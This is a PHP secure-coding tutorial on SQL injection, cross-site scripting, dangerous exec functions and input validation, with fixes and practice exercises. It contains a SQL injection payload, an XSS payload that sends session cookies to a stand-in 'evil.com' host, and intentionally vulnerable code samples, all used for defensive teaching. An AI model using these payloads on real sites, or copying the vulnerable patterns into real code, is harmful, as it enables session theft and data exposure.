# Security Essentials

Don't get hacked. Follow these essential practices that EVERY developer must know.

---

## ⚠️ The Three Rules You MUST Follow

1. **Never trust user input** - EVER
2. **Always validate and sanitize** - No exceptions
3. **Use parameterized queries** - Always, no matter what

Break these rules? Your app WILL be hacked.

---

## 🚨 Attack #1: SQL Injection

### How It Works

**Your innocent code:**
```php
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '" . $email . "'";
$user = DB::query($query);
```

**What a hacker sends:**
```
email: ' OR '1'='1
```

**Resulting query:**
```sql
SELECT * FROM users WHERE email = '' OR '1'='1'
```

**Result:** Hacker gets ALL users! 💀

---

### ❌ NEVER Do This

```php
// String concatenation = DANGER
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$query = "DELETE FROM orders WHERE id = " . $orderId;
$query = "UPDATE users SET email = '" . $email . "' WHERE id = " . $id;
```

---

### ✅ ALWAYS Do This

**Option 1: Use Parameterized Queries**
```php
// Question mark placeholders
$query = "SELECT * FROM users WHERE email = ?";
$user = DB::query($query, [$email]);

// Named placeholders
$query = "SELECT * FROM users WHERE email = :email";
$user = DB::query($query, ['email' => $email]);
```

**Option 2: Use an ORM or Query Builder**
```php
// Laravel Eloquent
$user = User::where('email', $email)->first();

// Query Builder
$user = DB::table('users')
    ->where('email', $email)
    ->first();
```

**Option 3: Use a Repository Pattern**
```php
// Best practice - hide the DB completely
$user = $this->userRepository->findByEmail($email);
```

---

### 🎯 Practice: Spot the Vulnerabilities

Find the SQL injection vulnerabilities:

```php
function searchProducts($searchTerm, $category) {
    // Query 1
    $query1 = "SELECT * FROM products WHERE name LIKE '%" . $searchTerm . "%'";
    
    // Query 2
    $query2 = "SELECT * FROM products WHERE category = ?";
    $results2 = DB::query($query2, [$category]);
    
    // Query 3
    $query3 = "SELECT * FROM products WHERE price < " . $_GET['maxPrice'];
    
    return DB::query($query1);
}
```

<details>
<summary>🎯 Show answer</summary>

**Vulnerabilities:**
- ❌ Query 1: Uses string concatenation with `$searchTerm`
- ✅ Query 2: Safe! Uses parameterized query
- ❌ Query 3: Uses string concatenation with `$_GET['maxPrice']`

**Fixed version:**
```php
function searchProducts(string $searchTerm, string $category, float $maxPrice): array {
    $query = "
        SELECT * FROM products 
        WHERE name LIKE ? 
        AND category = ?
        AND price < ?
    ";
    
    return DB::query($query, [
        '%' . $searchTerm . '%',
        $category,
        $maxPrice,
    ]);
}
```

</details>

---

## 🚨 Attack #2: Cross-Site Scripting (XSS)

### How It Works

**Your innocent code:**
```php
echo "<h1>Welcome, " . $_GET['name'] . "!</h1>";
```

**What a hacker sends:**
```
name: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**What gets rendered:**
```html
<h1>Welcome, <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>!</h1>
```

**Result:** Hacker steals session cookies from every user! 💀

---

### ❌ NEVER Do This

```php
// Directly outputting user input
echo $_GET['name'];
echo "<div>" . $userComment . "</div>";
echo "<h1>" . $title . "</h1>";
```

---

### ✅ ALWAYS Do This

**Use the `h()` function (or `htmlspecialchars()`)**

```php
// Safe output
echo h($_GET['name']);
echo "<div>" . h($userComment) . "</div>";
echo "<h1>" . h($title) . "</h1>";

// What h() does:
function h(string $text): string {
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

// Converts dangerous characters:
// < becomes &lt;
// > becomes &gt;
// " becomes &quot;
// ' becomes &#039;
```

---

### 🎯 When to Sanitize Output

**Always sanitize in templates:**
```php
<!-- GOOD -->
<div class="user-name"><?= h($user->getName()) ?></div>
<input type="text" value="<?= h($searchTerm) ?>">
<a href="/profile?id=<?= h($userId) ?>">View Profile</a>

<!-- BAD -->
<div class="user-name"><?= $user->getName() ?></div>
<input type="text" value="<?= $searchTerm ?>">
```

**Exception: When you explicitly allow HTML (be VERY careful)**
```php
// Use a sanitization library like HTMLPurifier
$allowedHtml = HTMLPurifier::clean($userInput);
echo $allowedHtml;
```

---

### 🎯 Practice: Fix the XSS Vulnerabilities

```php
<!DOCTYPE html>
<html>
<head>
    <title><?= $pageTitle ?></title>
</head>
<body>
    <h1>Search Results for: <?= $_GET['query'] ?></h1>
    
    <div class="results">
        <?php foreach ($results as $product): ?>
            <div class="product">
                <h2><?= $product->name ?></h2>
                <p><?= $product->description ?></p>
                <a href="/buy?id=<?= $product->id ?>">Buy Now</a>
            </div>
        <?php endforeach; ?>
    </div>
    
    <div class="user-comment">
        <?= $userComment ?>
    </div>
</body>
</html>
```

<details>
<summary>🎯 Show answer</summary>

```php
<!DOCTYPE html>
<html>
<head>
    <title><?= h($pageTitle) ?></title>
</head>
<body>
    <h1>Search Results for: <?= h($_GET['query']) ?></h1>
    
    <div class="results">
        <?php foreach ($results as $product): ?>
            <div class="product">
                <h2><?= h($product->name) ?></h2>
                <p><?= h($product->description) ?></p>
                <a href="/buy?id=<?= h($product->id) ?>">Buy Now</a>
            </div>
        <?php endforeach; ?>
    </div>
    
    <div class="user-comment">
        <?= h($userComment) ?>
        <!-- Or if you want to allow some HTML: -->
        <?= HTMLPurifier::clean($userComment) ?>
    </div>
</body>
</html>
```

**Rule:** If data came from a user (or database, or API), sanitize it!

</details>

---

## ⚠️ PHP Dangerous Functions

Avoid executing risky PHP functions that can run system commands or arbitrary code.

**Avoid:**
```php
exec($cmd);
shell_exec($cmd);
system($cmd);
passthru($cmd);
proc_open($cmd, $descriptors, $pipes);
popen($cmd, 'r');
eval($code);
create_function($code);
```

**Rules:**
- ✅ Disable these in production via `disable_functions`
- ✅ Never pass user input to system calls
- ✅ Prefer safe, library-provided APIs

---

## 🚨 Attack #3: Unvalidated Input

### The Problem

Not all attacks are about injection. Sometimes bad input just breaks your app:

```php
function createUser($data) {
    $user = new User();
    $user->email = $data['email'];  // What if it's not an email?
    $user->age = $data['age'];      // What if it's -500?
    $user->save();  // Bad data in database!
}

// Easy to corrupt
createUser(['email' => 'invalid', 'age' => -5]); // Creates invalid user
```

### ✅ ALWAYS Validate Input

**Validate Everything**

```php
class InvalidEmailException extends Exception {}
class InvalidAgeException extends Exception {}

public function registerUser(string $email, int $age): User {
    // Validate email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        throw new InvalidEmailException("Email '$email' is invalid");
    }
    
    // Validate age
    if ($age < 13 || $age > 150) {
        throw new InvalidAgeException("Age must be between 13 and 150");
    }
    
    // Now safe - create user
    $user = new User(email: $email, age: $age);
    $user->save();
    return $user;
}

// Safe - validates immediately
registerUser('test@example.com', 25);  // Works

// Throws before saving
registerUser('invalid', -5);  // Error caught early
```

**Use a Validation Library**

```php
// Laravel Validator
$validated = Validator::make($request->all(), [
    'email' => 'required|email|max:255',
    'name' => 'required|string|min:1|max:255',
    'age' => 'required|integer|min:13|max:150',
])->validate();

// Symfony Validator
$violations = $validator->validate($user, [
    new Assert\Email(),
    new Assert\NotBlank(),
    new Assert\Length(['min' => 1, 'max' => 255]),
]);
```

**Benefits:**
- ✅ Bad data never enters your system
- ✅ Clear, specific error messages
- ✅ Validation happens at the boundary

## 🎯 The Security Checklist

Before you deploy ANY code that handles user input:

### Input Handling
- [ ] All database queries use parameters (no string concatenation)
- [ ] All user input is validated (type, length, format)
- [ ] File uploads check file type and size
- [ ] Numeric inputs are cast to int/float after validation

### Output Handling
- [ ] All user-generated content is sanitized with `h()`
- [ ] HTML content is cleaned with a proper library
- [ ] JSON responses are properly encoded
- [ ] Error messages don't reveal sensitive info

### Authentication & Authorization
- [ ] Passwords are hashed (bcrypt/argon2)
- [ ] Session IDs are regenerated after login
- [ ] Authorization checks on EVERY protected action
- [ ] Rate limiting on login attempts

---

## 🚀 Real-World Example: Secure User Registration

### ❌ Insecure Version

```php
function register() {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // SQL Injection vulnerability
    $exists = DB::query("SELECT * FROM users WHERE email = '$email'");
    
    if ($exists) {
        echo "Email already exists!";  // XSS vulnerability
        return;
    }
    
    // Storing password in plain text! 💀
    DB::query("INSERT INTO users (email, password) VALUES ('$email', '$password')");
    
    echo "Welcome, $email!";  // XSS vulnerability
}
```

### ✅ Secure Version

```php
final class UserRegistrationService
{
    public function __construct(
        private readonly UserRepository $userRepository,
        private readonly PasswordHasher $passwordHasher,
        private readonly Validator $validator,
    ) {}
    
    public function register(RegisterUserCommand $command): User
    {
        // Validate input
        $this->validateCommand($command);
        
        // Check if user exists (safe query)
        if ($this->userRepository->existsByEmail($command->email)) {
            throw new UserAlreadyExistsException();
        }
        
        // Hash password
        $hashedPassword = $this->passwordHasher->hash($command->password);
        
        // Create user (repository handles safe queries)
        $user = new User(
            email: $command->email,
            hashedPassword: $hashedPassword,
        );
        
        DB::transaction(function() use ($user) {
            $this->userRepository->save($user);
        });
        
        return $user;
    }
    
    private function validateCommand(RegisterUserCommand $command): void
    {
        // Validate email
        if (!filter_var($command->email, FILTER_VALIDATE_EMAIL)) {
            throw new ValidationException('Invalid email format');
        }
        
        // Validate password strength
        if (strlen($command->password) < 8) {
            throw new ValidationException('Password must be at least 8 characters');
        }
        
        if (!preg_match('/[A-Z]/', $command->password)) {
            throw new ValidationException('Password must contain uppercase letter');
        }
        
        if (!preg_match('/[0-9]/', $command->password)) {
            throw new ValidationException('Password must contain a number');
        }
    }
}

// In your template (safe output):
<h1>Welcome, <?= h($user->getEmail()) ?>!</h1>
```

---

## 📚 Security Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web security risks
- [PHP Security Guide](https://www.php.net/manual/en/security.php) - Official PHP security docs
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free security training

---

## 📋 Security Quick Reference

| Attack | Defense | Example |
|--------|---------|---------|
| SQL Injection | Parameterized queries | `DB::query("SELECT * WHERE id = ?", [$id])` |
| XSS | Sanitize output with `h()` | `echo h($userInput)` |
| Bad Input | Validate everything | `filter_var($email, FILTER_VALIDATE_EMAIL)` |
| Weak Passwords | Hash with bcrypt | `password_hash($pwd, PASSWORD_BCRYPT)` |

---

## 🎓 Remember

**Security is not optional.** These aren't "nice to have" practices - they're MANDATORY.

One security hole = entire app compromised = customer data stolen = company sued = your reputation destroyed.

**No excuses. Secure your code.** 🔒
